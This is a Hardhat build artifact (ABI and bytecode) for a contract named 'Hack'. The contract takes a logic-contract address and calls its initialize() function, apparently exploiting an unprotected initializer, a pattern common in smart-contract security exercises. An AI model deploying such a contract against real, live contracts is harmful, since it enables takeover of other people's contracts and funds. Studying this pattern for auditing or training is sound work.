{
  "_format": "hh-sol-artifact-1",
  "contractName": "Hack",
  "sourceName": "contracts/Hack.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_logic",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "callinitialize",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516102d53803806102d58339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610241806100946000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c806306d8c44814610030575b600080fd5b61003861003a565b005b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527f8129fc1c000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b6020831061012a5780518252602082019150602081019050602083039250610107565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d806000811461018c576040519150601f19603f3d011682016040523d82523d6000602084013e610191565b606091505b5050905080610208576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260158152602001807f696e6974616c697a652063616c6c206661696c6564000000000000000000000081525060200191505060405180910390fd5b5056fea26469706673582212209dd105d7248e1ea5390a8448d769fc85a5c5967693c2e870625c1bd0a21e9b4364736f6c63430006090033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}